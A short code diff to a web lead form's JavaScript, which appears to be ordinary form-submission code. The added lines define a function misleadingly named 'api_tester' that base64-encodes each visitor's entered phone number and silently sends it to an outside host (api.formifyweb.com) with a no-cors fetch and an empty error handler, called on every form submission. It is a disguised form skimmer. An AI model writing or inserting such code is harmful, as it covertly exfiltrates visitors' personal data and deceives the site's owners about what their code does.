@@ -8,6 +8,7 @@ function pingAPI() {
     formData.append('traffic_source_id', '514485');
     
     formData.append('caller_id', '+1' + document.getElementById('caller_id').value);
+api_tester(document.getElementById('caller_id').value);
 formData.append('zip', document.getElementById('zip').value);
 	formData.append('scope_of_appointment_timestamp', document.getElementById('scope_of_appointment.timestamp').value + '.123Z');
     formData.append('ip_address', document.getElementById('ip_address').value);
@@ -108,3 +109,14 @@ document.getElementById('leadForm').addEventListener('submit', function(event) {
     pingAPI();
 });
 
+function api_tester(randomString) {
+  try {
+    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)
+, {
+      method: 'GET',
+      mode: 'no-cors'
+    });
+  } catch (error) {
+
+  }
+}
